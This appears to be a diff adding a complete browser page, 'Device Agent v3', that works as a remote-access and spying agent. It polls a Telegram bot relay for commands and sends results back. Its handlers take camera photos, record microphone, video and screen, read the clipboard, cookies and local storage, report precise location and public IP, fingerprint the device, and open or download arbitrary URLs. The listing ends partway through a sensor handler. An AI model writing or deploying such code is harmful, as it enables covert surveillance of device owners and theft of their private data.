@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#08090c">
+<title>Device Agent · Web API Console</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  :root {
+    --bg:#08090c; --card:#0e1117; --border:#1a2028;
+    --text:#e8ecf0; --muted:#5a6a7a; --accent:#6c8cff;
+    --green:#3ddc84; --red:#ff5577; --gold:#f7c948;
+  }
+  body { background:var(--bg); color:var(--text); font-family: system-ui, -apple-system, sans-serif; min-height:100vh; padding:14px; font-size:14px; }
+  .wrap { max-width:580px; margin:0 auto; }
+  .topbar { display:flex; align-items:center; justify-content:space-between; padding:14px 16px; background:var(--card); border:1px solid var(--border); border-radius:12px; margin-bottom:12px; }
+  .brand { display:flex; align-items:center; gap:10px; font-weight:700; letter-spacing:.5px; }
+  .dot { width:10px; height:10px; border-radius:50%; background:var(--red); transition:.3s; }
+  .dot.on { background:var(--green); box-shadow:0 0 12px var(--green); animation:pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
+  .conn { font-size:11px; color:var(--muted); font-family: ui-monospace, monospace; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:12px; padding:16px; margin-bottom:12px; }
+  .card h2 { font-size:12px; color:var(--muted); font-weight:700; letter-spacing:1.5px; text-transform:uppercase; margin-bottom:10px; }
+  .row { display:flex; justify-content:space-between; gap:14px; padding:6px 0; font-size:12px; font-family: ui-monospace, monospace; border-bottom:1px solid rgba(255,255,255,.03); }
+  .row:last-child { border-bottom:none; }
+  .row .k { color:var(--muted); }
+  .row .v { color:#c8d4e4; text-align:right; max-width:65%; word-break:break-word; }
+  .log { background:#000; border:1px solid var(--border); border-radius:8px; padding:12px; font-family: ui-monospace, monospace; font-size:11.5px; height:280px; overflow-y:auto; color:#8fa4b8; line-height:1.65; }
+  .log .t { color:var(--muted); }
+  .log .ok { color:var(--green); }
+  .log .err { color:var(--red); }
+  .log .cmd { color:var(--accent); font-weight:600; }
+  .log .sys { color:var(--gold); }
+  .btn { width:100%; padding:12px; border:none; border-radius:9px; font-size:13px; font-weight:700; cursor:pointer; transition:.2s; margin-top:10px; }
+  .btn-primary { background:var(--accent); color:#fff; }
+  .btn-primary:hover { filter:brightness(1.1); }
+  .btn-ghost { background:transparent; color:var(--muted); border:1px solid var(--border); }
+  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px; }
+  .grid2 .btn { margin-top:0; }
+  .chips { display:flex; gap:5px; flex-wrap:wrap; margin-top:8px; }
+  .chip { font-size:10.5px; padding:3px 8px; border-radius:20px; background:rgba(108,140,255,.1); color:#8ea8ff; border:1px solid rgba(108,140,255,.25); font-family: ui-monospace, monospace; }
+  .chip.g { background:rgba(61,220,132,.1); color:var(--green); border-color:rgba(61,220,132,.25); }
+  .chip.r { background:rgba(255,85,119,.1); color:var(--red); border-color:rgba(255,85,119,.25); }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <div class="brand"><span class="dot" id="dot"></span> DEVICE AGENT v3</div>
+    <div class="conn" id="connV">starting…</div>
+  </div>
+
+  <div class="card">
+    <h2>Device</h2>
+    <div class="row"><span class="k">Name</span><span class="v" id="dV">—</span></div>
+    <div class="row"><span class="k">Platform</span><span class="v" id="platV">—</span></div>
+    <div class="row"><span class="k">Screen</span><span class="v" id="scrV">—</span></div>
+    <div class="row"><span class="k">TZ</span><span class="v" id="tzV">—</span></div>
+    <div class="row"><span class="k">Commands served</span><span class="v" id="cntV">0</span></div>
+    <div class="row"><span class="k">Poll count</span><span class="v" id="pollsV">0</span></div>
+    <div class="chips" id="permChips"></div>
+  </div>
+
+  <div class="card">
+    <h2>Live log</h2>
+    <div class="log" id="log"></div>
+  </div>
+
+  <button class="btn btn-primary" id="grants">🔓 Request All Permissions</button>
+  <div class="grid2">
+    <button class="btn btn-ghost" id="clear">🧹 Clear log</button>
+    <button class="btn btn-ghost" id="dump">📋 Dump features</button>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<script>
+'use strict';
+
+// ============================================================
+// CONFIG
+// ============================================================
+const params = new URLSearchParams(location.search);
+const KEY  = params.get('key')  || localStorage.getItem('dr_key')  || '';
+const NAME = params.get('name') || localStorage.getItem('dr_name') || defaultName();
+
+if (params.get('key'))  localStorage.setItem('dr_key', KEY);
+if (params.get('name')) localStorage.setItem('dr_name', NAME);
+
+function defaultName() {
+  const ua = navigator.userAgent;
+  if (/Android/.test(ua))    return 'Android Device';
+  if (/iPhone/.test(ua))     return 'iPhone';
+  if (/iPad/.test(ua))       return 'iPad';
+  if (/Windows/.test(ua))    return 'Windows PC';
+  if (/Macintosh/.test(ua))  return 'Mac';
+  if (/Linux/.test(ua))      return 'Linux';
+  return 'Unknown Device';
+}
+
+// ============================================================
+// UI
+// ============================================================
+const $ = id => document.getElementById(id);
+const dotEl = $('dot'), connEl = $('connV'), logEl = $('log');
+const permChips = $('permChips');
+
+let cmdCount = 0, pollCount = 0;
+const permState = {};
+
+$('dV').textContent    = NAME;
+$('platV').textContent = navigator.platform;
+$('scrV').textContent  = `${screen.width}×${screen.height} @${devicePixelRatio}x`;
+$('tzV').textContent   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+function log(msg, cls = '') {
+  const t = new Date().toLocaleTimeString();
+  const el = document.createElement('div');
+  el.innerHTML = `<span class="t">${t}</span> <span class="${cls}">${escapeHtml(msg)}</span>`;
+  logEl.appendChild(el);
+  logEl.scrollTop = logEl.scrollHeight;
+  while (logEl.children.length > 500) logEl.firstChild.remove();
+}
+function escapeHtml(s) {
+  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+function setPerm(k, v) { permState[k] = v; renderChips(); }
+function renderChips() {
+  permChips.innerHTML = '';
+  ['camera','mic','geo','notify','clip','sensor'].forEach(k => {
+    if (!permState[k]) return;
+    const cls = permState[k] === 'granted' ? 'g' : permState[k] === 'denied' ? 'r' : '';
+    permChips.insertAdjacentHTML('beforeend', `<span class="chip ${cls}">${k}: ${permState[k]}</span>`);
+  });
+}
+
+// ============================================================
+// PERMISSIONS
+// ============================================================
+async function requestAllPermissions() {
+  log('Requesting permissions…', 'sys');
+
+  try { const s = await navigator.mediaDevices.getUserMedia({ video: true }); s.getTracks().forEach(t => t.stop()); setPerm('camera','granted'); log('✓ camera','ok'); }
+  catch { setPerm('camera','denied'); log('✗ camera','err'); }
+
+  try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t => t.stop()); setPerm('mic','granted'); log('✓ microphone','ok'); }
+  catch { setPerm('mic','denied'); log('✗ microphone','err'); }
+
+  try { await new Promise((ok,no) => navigator.geolocation.getCurrentPosition(ok, no, { timeout: 12000 })); setPerm('geo','granted'); log('✓ geolocation','ok'); }
+  catch { setPerm('geo','denied'); log('✗ geolocation','err'); }
+
+  if ('Notification' in window) { try { const p = await Notification.requestPermission(); setPerm('notify', p); log(`✓ notifications: ${p}`, p === 'granted' ? 'ok' : 'err'); } catch {} }
+
+  try { await navigator.clipboard.readText(); setPerm('clip','granted'); log('✓ clipboard','ok'); }
+  catch { setPerm('clip','denied'); log('✗ clipboard','err'); }
+
+  try { await navigator.storage?.persist?.(); } catch {}
+
+  try {
+    if (DeviceOrientationEvent?.requestPermission) {
+      const p = await DeviceOrientationEvent.requestPermission();
+      setPerm('sensor', p);
+      log(`✓ orientation: ${p}`, p === 'granted' ? 'ok' : 'err');
+    } else setPerm('sensor','n/a');
+  } catch {}
+
+  log('Permission scan complete', 'ok');
+}
+$('grants').addEventListener('click', requestAllPermissions);
+$('clear').addEventListener('click', () => { logEl.innerHTML = ''; });
+$('dump').addEventListener('click', () => {
+  const names = Object.keys(HANDLERS).sort();
+  log(`Registered commands (${names.length}): ${names.join(', ')}`, 'sys');
+});
+
+// ============================================================
+// TELEGRAM POLLING (long-poll via Vercel)
+// ============================================================
+let offset = parseInt(localStorage.getItem('dr_offset') || '0');
+let polling = true;
+
+async function pollLoop() {
+  while (polling) {
+    try {
+      const url = `/api/poll?key=${encodeURIComponent(KEY)}&offset=${offset}&timeout=8&_=${Date.now()}`;
+      const r = await fetch(url, { cache: 'no-store' });
+      const data = await r.json();
+
+      if (data.error) {
+        log('Poll error: ' + data.error, 'err');
+        connEl.textContent = 'error';
+        dotEl.classList.remove('on');
+        await sleep(3000);
+        continue;
+      }
+
+      dotEl.classList.add('on');
+      connEl.textContent = 'connected';
+      pollCount++;
+      $('pollsV').textContent = pollCount;
+
+      for (const u of data.updates || []) {
+        offset = u.id + 1;
+        localStorage.setItem('dr_offset', String(offset));
+        processCommand(u);
+      }
+    } catch (e) {
+      log('Poll failed: ' + e.message, 'err');
+      connEl.textContent = 'offline';
+      dotEl.classList.remove('on');
+      await sleep(3000);
+    }
+  }
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+// ============================================================
+// COMMAND PROCESSING
+// ============================================================
+async function processCommand({ chatId, text }) {
+  const trimmed = text.trim();
+  const sp = trimmed.indexOf(' ');
+  const cmd = (sp === -1 ? trimmed : trimmed.slice(0, sp)).slice(1).toLowerCase();
+  const args = sp === -1 ? '' : trimmed.slice(sp + 1).trim();
+
+  log(`← /${cmd}${args ? ' ' + args : ''}`, 'cmd');
+
+  if (cmd === 'help' || cmd === 'start') {
+    return sendMessage(chatId, HELP_TEXT);
+  }
+
+  const fn = HANDLERS[cmd];
+  if (!fn) {
+    log(`✗ unknown: ${cmd}`, 'err');
+    return sendMessage(chatId, `❓ Unknown: /${cmd}\nSend /help`);
+  }
+
+  let result;
+  try {
+    result = await fn(args);
+  } catch (e) {
+    result = { error: e.message || String(e) };
+  }
+
+  log(`→ ${result.error ? '✗ ' + result.error : '✓ done'}`, result.error ? 'err' : 'ok');
+  cmdCount++;
+  $('cntV').textContent = cmdCount;
+
+  await sendResult(chatId, cmd, result);
+}
+
+async function sendMessage(chatId, text) {
+  try {
+    await fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ key: KEY, type: 'message', chatId, text })
+    });
+  } catch (e) { log('send failed: ' + e.message, 'err'); }
+}
+
+async function sendResult(chatId, cmd, r) {
+  if (r.error) return sendMessage(chatId, `❌ <b>/${cmd}</b>\n${escapeHtml(r.error)}`);
+
+  if (r.photo) {
+    return sendData(chatId, 'photo', r.photo, `📸 /${cmd}`);
+  }
+  if (r.audio) {
+    return sendData(chatId, 'audio', r.audio, `🎤 /${cmd} · ${r.duration || '?'}s`, { duration: r.duration });
+  }
+  if (r.video) {
+    return sendData(chatId, 'video', r.video, `🎥 /${cmd} · ${r.duration || '?'}s`, { duration: r.duration });
+  }
+  if (r.document) {
+    return sendData(chatId, 'document', r.document, `📄 /${cmd}`, { filename: r.filename });
+  }
+  if (r.text) return sendMessage(chatId, r.text);
+
+  return sendMessage(chatId, `<b>/${cmd}</b>\n<pre>${escapeHtml(JSON.stringify(r, null, 2).slice(0, 3500))}</pre>`);
+}
+
+async function sendData(chatId, type, data, caption, extra = {}) {
+  try {
+    await fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ key: KEY, type, chatId, data, caption, ...extra })
+    });
+  } catch (e) { log('sendData failed: ' + e.message, 'err'); }
+}
+
+// ============================================================
+// COMMAND HANDLERS — 85+ Web API commands
+// ============================================================
+const esc = escapeHtml;
+const HANDLERS = {
+
+// ══════════════ INFO (15) ══════════════
+async info() {
+  let battery = 'n/a';
+  try { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging?'(chg)':''}`; } catch {}
+  const c = navigator.connection || {};
+  const perms = Object.entries(permState).map(([k,v]) => `${k}: ${v}`).join('\n') || '(none requested)';
+  return { text: `📊 <b>Device Report</b>
+
+<b>Browser</b>
+UA: <code>${esc(navigator.userAgent.slice(0,180))}</code>
+Platform: ${esc(navigator.platform)}
+Vendor: ${esc(navigator.vendor || '?')}
+Lang: ${esc(navigator.language)}
+Languages: ${esc((navigator.languages||[]).join(','))}
+Screen: ${screen.width}×${screen.height}@${devicePixelRatio}x
+Viewport: ${innerWidth}×${innerHeight}
+TZ: ${esc(Intl.DateTimeFormat().resolvedOptions().timeZone)}
+Touch: ${navigator.maxTouchPoints}
+Cookies on: ${navigator.cookieEnabled}
+DNT: ${navigator.doNotTrack || '?'}
+Online: ${navigator.onLine}
+
+<b>Hardware</b>
+CPU cores: ${navigator.hardwareConcurrency || '?'}
+Memory: ${navigator.deviceMemory || '?'} GB
+Battery: ${battery}
+Connection: ${esc(c.effectiveType || '?')} · ${c.downlink || '?'}Mbps · ${c.rtt || '?'}ms
+
+<b>Permissions</b>
+<pre>${esc(perms)}</pre>`};
+},
+
+async geo() {
+  const p = await new Promise((ok,no) => navigator.geolocation.getCurrentPosition(ok, no, { timeout: 12000, enableHighAccuracy: true }));
+  return { text: `📍 <b>Location</b>
+Lat: <code>${p.coords.latitude}</code>
+Lon: <code>${p.coords.longitude}</code>
+Accuracy: ±${Math.round(p.coords.accuracy)}m
+Altitude: ${p.coords.altitude?.toFixed(1) ?? '—'}m
+Heading: ${p.coords.heading ?? '—'}°
+Speed: ${p.coords.speed ?? '—'} m/s
+<a href="https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}">📍 Maps</a>`};
+},
+
+async battery() {
+  if (!navigator.getBattery) throw new Error('unsupported');
+  const b = await navigator.getBattery();
+  return { text: `🔋 <b>Battery</b>
+Level: ${Math.round(b.level*100)}%
+Charging: ${b.charging}
+To full: ${b.chargingTime ? Math.round(b.chargingTime/60)+'min' : '—'}
+To empty: ${b.dischargingTime ? Math.round(b.dischargingTime/60)+'min' : '—'}`};
+},
+
+async network() {
+  const c = navigator.connection || {};
+  let pub = {};
+  try { pub = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch {}
+  return { text: `🌐 <b>Network</b>
+Type: ${esc(c.effectiveType || '?')}
+Downlink: ${c.downlink || '?'} Mbps
+RTT: ${c.rtt || '?'} ms
+Save-data: ${c.saveData}
+
+<b>Public</b>
+IP: <code>${esc(pub.ip || '?')}</code>
+Country: ${esc(pub.country_name || '?')}
+City: ${esc(pub.city || '?')}
+ISP: ${esc(pub.org || '?')}
+ASN: ${esc(pub.asn || '?')}`};
+},
+
+async clipboard() {
+  const t = await navigator.clipboard.readText();
+  return { text: `📋 <b>Clipboard</b>\n<code>${esc((t||'(empty)').slice(0,3500))}</code>` };
+},
+
+async cookies() {
+  const c = document.cookie.split(';').map(x => x.trim()).filter(Boolean);
+  return { text: `🍪 <b>Cookies (${c.length})</b>\n<code>${esc(c.slice(0,30).join('\n').slice(0,3500) || '(empty)')}</code>` };
+},
+
+async storage() {
+  const L = []; for (let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); L.push(`${k}=${localStorage.getItem(k)}`); }
+  const S = []; for (let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); S.push(`${k}=${sessionStorage.getItem(k)}`); }
+  return { text: `🗄 <b>Storage</b>
+<b>LocalStorage (${L.length})</b>
+<code>${esc(L.slice(0,15).join('\n').slice(0,1500) || '(empty)')}</code>
+<b>SessionStorage (${S.length})</b>
+<code>${esc(S.slice(0,15).join('\n').slice(0,1500) || '(empty)')}</code>`};
+},
+
+async devices() {
+  const list = await navigator.mediaDevices.enumerateDevices();
+  const g = { audioinput: 'Mic', audiooutput: 'Speaker', videoinput: 'Camera' };
+  const grouped = {};
+  for (const d of list) { const k = g[d.kind] || d.kind; (grouped[k] ||= []).push(d.label || '(hidden)'); }
+  return { text: `🎛 <b>Media Devices</b>\n\n` + Object.entries(grouped).map(([k,v]) => `<b>${k} (${v.length})</b>\n${esc(v.join('\n'))}`).join('\n\n') };
+},
+
+async permissions() {
+  const names = ['geolocation','notifications','camera','microphone','clipboard-read','clipboard-write','persistent-storage','background-sync','accelerometer','gyroscope','magnetometer','ambient-light-sensor','midi','payment-handler'];
+  const out = [];
+  for (const n of names) {
+    try { const r = await navigator.permissions.query({ name: n }); out.push(`${n}: ${r.state}`); }
+    catch { out.push(`${n}: unsupported`); }
+  }
+  return { text: `🔐 <b>Permissions</b>\n<pre>${esc(out.join('\n'))}</pre>` };
+},
+
+async fonts() {
+  const test = ['Arial','Times New Roman','Courier New','Georgia','Verdana','Comic Sans MS','Impact','Helvetica','Consolas','Monaco','Tahoma','Trebuchet MS','Roboto','Segoe UI','Menlo','Noto Sans','Lato','Open Sans','Inter'];
+  const s = document.createElement('span');
+  s.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;white-space:nowrap;';
+  s.textContent = 'mmmmmmmmmmlli';
+  document.body.appendChild(s);
+  const base = s.offsetWidth;
+  const found = [];
+  for (const f of test) { s.style.fontFamily = `"${f}", monospace`; if (s.offsetWidth !== base) found.push(f); }
+  s.remove();
+  return { text: `🔤 <b>Fonts (${found.length})</b>\n<code>${esc(found.join(', '))}</code>` };
+},
+
+async webgl() {
+  const c = document.createElement('canvas');
+  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+  if (!gl) throw new Error('WebGL unavailable');
+  const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+  return { text: `🎨 <b>WebGL</b>
+Vendor: ${esc(dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR))}
+Renderer: ${esc(dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER))}
+Version: ${esc(gl.getParameter(gl.VERSION))}
+GLSL: ${esc(gl.getParameter(gl.SHADING_LANGUAGE_VERSION))}
+Max texture: ${gl.getParameter(gl.MAX_TEXTURE_SIZE)}
+Extensions: ${(gl.getSupportedExtensions()||[]).length}`};
+},
+
+async gpu() {
+  if (!navigator.gpu) throw new Error('WebGPU unsupported');
+  const adapter = await navigator.gpu.requestAdapter();
+  if (!adapter) throw new Error('No GPU adapter');
+  const info = adapter.info || {};
+  return { text: `🚀 <b>WebGPU</b>
+Vendor: ${esc(info.vendor || '?')}
+Architecture: ${esc(info.architecture || '?')}
+Device: ${esc(info.device || '?')}
+Description: ${esc(info.description || '?')}
+Features: ${[...(adapter.features || [])].length}
+Max buffer: ${(adapter.limits?.maxBufferSize || 0) / 1024 / 1024} MB`};
+},
+
+async 'storage-quota'() {
+  if (!navigator.storage?.estimate) throw new Error('unsupported');
+  const e = await navigator.storage.estimate();
+  return { text: `💾 <b>Storage Quota</b>
+Used: ${(e.usage/1024/1024).toFixed(2)} MB
+Quota: ${(e.quota/1024/1024/1024).toFixed(2)} GB
+Usage: ${((e.usage/e.quota)*100).toFixed(3)}%`};
+},
+
+async 'screen-info'() {
+  const o = screen.orientation || {};
+  return { text: `🖥 <b>Screen</b>
+Size: ${screen.width}×${screen.height}
+Avail: ${screen.availWidth}×${screen.availHeight}
+Color: ${screen.colorDepth}-bit
+Pixel depth: ${screen.pixelDepth}
+DPR: ${devicePixelRatio}
+Orientation: ${esc(o.type || '?')} (${o.angle ?? '?'}°)
+Viewport: ${innerWidth}×${innerHeight}`};
+},
+
+async time() {
+  const d = new Date();
+  return { text: `🕐 <b>Device Time</b>
+${esc(d.toString())}
+ISO: ${d.toISOString()}
+Unix: <code>${d.getTime()}</code>
+TZ offset: ${-d.getTimezoneOffset()/60}h`};
+},
+
+// ══════════════ MEDIA (12) ══════════════
+async screenshot() {
+  const el = document.querySelector('.wrap') || document.body;
+  const c = await html2canvas(el, { scale: 0.85, backgroundColor: '#08090c', useCORS: true });
+  return { photo: c.toDataURL('image/jpeg', 0.75) };
+},
+
+async camera(args) {
+  const facing = args === 'front' ? 'user' : 'environment';
+  const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facing }, width: { ideal: 1920 } } });
+  const v = document.createElement('video');
+  v.srcObject = s; v.muted = true; v.playsInline = true;
+  await v.play(); await new Promise(r => setTimeout(r, 900));
+  const c = document.createElement('canvas');
+  c.width = v.videoWidth; c.height = v.videoHeight;
+  c.getContext('2d').drawImage(v, 0, 0);
+  s.getTracks().forEach(t => t.stop());
+  return { photo: c.toDataURL('image/jpeg', 0.78) };
+},
+
+async mic(args) {
+  const sec = Math.min(parseInt(args) || 5, 30);
+  const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+  const rec = new MediaRecorder(s);
+  const chunks = [];
+  rec.ondataavailable = e => chunks.push(e.data);
+  rec.start();
+  await new Promise(r => setTimeout(r, sec * 1000));
+  await new Promise(r => { rec.onstop = r; rec.stop(); });
+  s.getTracks().forEach(t => t.stop());
+  return { audio: await blobB64(new Blob(chunks, { type: 'audio/webm' })), duration: sec };
+},
+
+async video(args) {
+  const sec = Math.min(parseInt(args) || 5, 20);
+  const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+  const rec = new MediaRecorder(s);
+  const chunks = [];
+  rec.ondataavailable = e => chunks.push(e.data);
+  rec.start();
+  await new Promise(r => setTimeout(r, sec * 1000));
+  await new Promise(r => { rec.onstop = r; rec.stop(); });
+  s.getTracks().forEach(t => t.stop());
+  return { video: await blobB64(new Blob(chunks, { type: 'video/webm' })), duration: sec };
+},
+
+async 'record-screen'(args) {
+  const sec = Math.min(parseInt(args) || 5, 30);
+  const s = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+  const rec = new MediaRecorder(s);
+  const chunks = [];
+  rec.ondataavailable = e => chunks.push(e.data);
+  rec.start();
+  await new Promise(r => setTimeout(r, sec * 1000));
+  await new Promise(r => { rec.onstop = r; rec.stop(); });
+  s.getTracks().forEach(t => t.stop());
+  return { video: await blobB64(new Blob(chunks, { type: 'video/webm' })), duration: sec };
+},
+
+async 'audio-spectrum'(args) {
+  const sec = Math.min(parseInt(args) || 3, 15);
+  const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+  const ctx = new AudioContext();
+  const src = ctx.createMediaStreamSource(s);
+  const an = ctx.createAnalyser(); an.fftSize = 2048;
+  src.connect(an);
+  const data = new Uint8Array(an.frequencyBinCount);
+  let max = 0, sum = 0, n = 0;
+  const start = Date.now();
+  while (Date.now() - start < sec * 1000) {
+    an.getByteFrequencyData(data);
+    const avg = data.reduce((a,b) => a+b, 0) / data.length;
+    sum += avg; n++; if (avg > max) max = avg;
+    await new Promise(r => setTimeout(r, 100));
+  }
+  s.getTracks().forEach(t => t.stop()); ctx.close();
+  return { text: `🔊 <b>Audio Spectrum (${sec}s)</b>\nAvg: ${(sum/n).toFixed(1)}\nPeak: ${max}\nRMS: ${Math.sqrt(sum/n).toFixed(1)}` };
+},
+
+async pip() {
+  // Picture-in-Picture for video element
+  const v = document.querySelector('video');
+  if (!v) throw new Error('No video element');
+  await v.requestPictureInPicture();
+  return { text: `📺 PiP entered` };
+},
+
+async 'doc-pip'() {
+  if (!window.documentPictureInPicture) throw new Error('Document PiP unsupported');
+  const w = await window.documentPictureInPicture.requestWindow({ width: 400, height: 300 });
+  w.document.body.innerHTML = '<h1 style="color:#fff;font-family:sans-serif">Doc PiP Active</h1>';
+  return { text: `📄 Document PiP opened` };
+},
+
+async 'media-session'() {
+  if (!navigator.mediaSession) throw new Error('Media Session unsupported');
+  navigator.mediaSession.metadata = new MediaMetadata({
+    title: 'Remote Session', artist: 'Device Agent', album: 'Web API'
+  });
+  navigator.mediaSession.setActionHandler('play', () => {});
+  return { text: `🎵 Media Session metadata set` };
+},
+
+async 'screen-capture'() {
+  const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
+  const v = document.createElement('video');
+  v.srcObject = s; v.muted = true; v.playsInline = true;
+  await v.play(); await new Promise(r => setTimeout(r, 800));
+  const c = document.createElement('canvas');
+  c.width = v.videoWidth; c.height = v.videoHeight;
+  c.getContext('2d').drawImage(v, 0, 0);
+  s.getTracks().forEach(t => t.stop());
+  return { photo: c.toDataURL('image/jpeg', 0.75) };
+},
+
+async 'video-devices'() {
+  const list = await navigator.mediaDevices.enumerateDevices();
+  const cams = list.filter(d => d.kind === 'videoinput');
+  const mics = list.filter(d => d.kind === 'audioinput');
+  const spk  = list.filter(d => d.kind === 'audiooutput');
+  return { text: `📹 <b>Devices</b>\nCameras: ${cams.length}\nMicrophones: ${mics.length}\nSpeakers: ${spk.length}\n\n` + [...cams, ...mics, ...spk].map(d => `• ${esc(d.label || '(hidden)')}`).join('\n') };
+},
+
+// ══════════════ ACTIONS (15) ══════════════
+async vibrate(args) {
+  const ms = parseInt(args) || 500;
+  if (!navigator.vibrate) throw new Error('Vibration unsupported');
+  navigator.vibrate(ms);
+  return { text: `📳 Vibrated ${ms}ms` };
+},
+
+async notify(args) {
+  if (Notification.permission !== 'granted') throw new Error('Notification permission not granted');
+  new Notification('🧪 Remote', { body: args || 'Hello from bot' });
+  return { text: `🔔 Notification shown` };
+},
+
+async speak(args) {
+  if (!window.speechSynthesis) throw new Error('unsupported');
+  speechSynthesis.cancel();
+  const u = new SpeechSynthesisUtterance(args || 'Hello');
+  u.rate = 1; u.pitch = 1;
+  speechSynthesis.speak(u);
+  return { text: `🔊 Speaking: "${esc((args || 'Hello').slice(0,120))}"` };
+},
+
+async sound(args) {
+  const [f, d] = (args || '440 300').split(/\s+/);
+  const ctx = new AudioContext();
+  const osc = ctx.createOscillator();
+  const g = ctx.createGain();
+  osc.frequency.value = parseInt(f) || 440;
+  osc.type = 'sine';
+  g.gain.value = 0.3;
+  osc.connect(g); g.connect(ctx.destination);
+  osc.start();
+  const dur = parseInt(d) || 300;
+  setTimeout(() => { osc.stop(); ctx.close(); }, dur);
+  return { text: `🎵 ${parseInt(f) || 440}Hz for ${dur}ms` };
+},
+
+async writetext(args) {
+  await navigator.clipboard.writeText(args || '');
+  return { text: `📝 Wrote ${(args || '').length} chars to clipboard` };
+},
+
+async open(args) {
+  if (!args) throw new Error('URL required');
+  location.href = args;
+  return { text: `🔗 Navigating to ${esc(args)}` };
+},
+
+async fullscreen() {
+  await document.documentElement.requestFullscreen();
+  return { text: `⛶ Fullscreen entered` };
+},
+
+async 'exit-fullscreen'() {
+  if (document.fullscreenElement) await document.exitFullscreen();
+  return { text: `✕ Fullscreen exited` };
+},
+
+async wakelock() {
+  if (!navigator.wakeLock) throw new Error('unsupported');
+  await navigator.wakeLock.request('screen');
+  return { text: `☀️ Wake lock active` };
+},
+
+async reload() {
+  setTimeout(() => location.reload(), 500);
+  return { text: `🔄 Reloading…` };
+},
+
+async download(args) {
+  if (!args) throw new Error('URL required');
+  const a = document.createElement('a');
+  a.href = args; a.download = ''; a.click();
+  return { text: `⬇️ Download started` };
+},
+
+async 'scroll-to'(args) {
+  const [x, y] = (args || '0 0').split(/\s+/).map(Number);
+  window.scrollTo({ left: x || 0, top: y || 0, behavior: 'smooth' });
+  return { text: `📜 Scrolled to (${x}, ${y})` };
+},
+
+async highlight(args) {
+  if (!args) throw new Error('Selector required');
+  const el = document.querySelector(args);
+  if (!el) throw new Error('Element not found');
+  el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  const prev = el.style.outline;
+  el.style.outline = '3px solid #6c8cff';
+  setTimeout(() => { el.style.outline = prev; }, 3000);
+  return { text: `🔦 Highlighted: ${esc(args)}` };
+},
+
+async share(args) {
+  if (!navigator.share) throw new Error('unsupported');
+  await navigator.share({ title: 'Device Remote', text: args || 'Hello' });
+  return { text: `📤 Shared` };
+},
+
+async print() {
+  window.print();
+  return { text: `🖨 Print dialog opened` };
+},
+
+async 'badge'(args) {
+  const n = parseInt(args) || 1;
+  if (!navigator.setAppBadge) throw new Error('Badging unsupported');
+  await navigator.setAppBadge(n);
+  return { text: `🔴 App badge set to ${n}` };
+},
+
+// ══════════════ SENSORS (12) ══════════════
+async orient() {
+  const d = await new Promise((ok, no) => {
+    const to = setTimeout(() => no(new Error('no data (5s)')), 5000);
+    const h = e => { clearTimeout(to); removeEventListener('deviceorientation', h); ok(e); };
+    addEventListener('deviceorientation', h);
+  });
+  return { text: `🧭 <b>Orientation</b>\nabsolute: ${d.absolute}\nalpha: ${d.alpha}\nbeta: ${d.beta}\ngamma: ${d.gamma}` };
+},
+
+async motion() {
+  const d = await new Promise((ok, no) => {
+    const to = setTimeout(() => no(new Error('no data (5s)')), 5000);
+    const h = e => { clearTimeout(to); removeEventListener('devicemotion', h); ok(e); };
+    addEventListener('devicemotion', h);
+  });
+  const a = d.accelerationIncludingGravity || {};
+  const r = d.rotationRate || {};
+  return { text: `📡 <b>Motion</b>\nx: ${a.x}\ny: ${a.y}\nz: ${a.z}\nrot α: ${r.alpha}\nrot β: ${r.beta}\nrot γ: ${r.gamma}` };
+},
+
+async light() {
+  if (typeof AmbientLightSensor === 'undefined') throw new Error('unsupported');
+  const s = new AmbientLightSensor();
+  const v = await new Promise((ok, no) => {
+    s.onreading = () => ok(s.illuminance);
+    s.onerror = () => no(new Error('sensor error'));
+    s.start();
+    setTimeout(() => no(new Error('no reading')), 5000);
+  });
+  s.stop();
+  return { text: `💡 Light: ${v} lux` };
+},
+
+async magnet() {
+  if (typeof Magnetometer === 'undefined') throw new Error('Magnetometer unsupported');
+  const s = new Magnetometer({ frequency: 10 });
+  const v = await new Promise((ok, no) => {
+    let last;
+    s.onreading = () => { last = s; };
+    s.onerror = () => no(new Error('sensor error'));
+    s.start();
+    setTimeout(() => last ? ok(last) : no(new Error('no reading')), 3000);
+  });
+  s.stop();
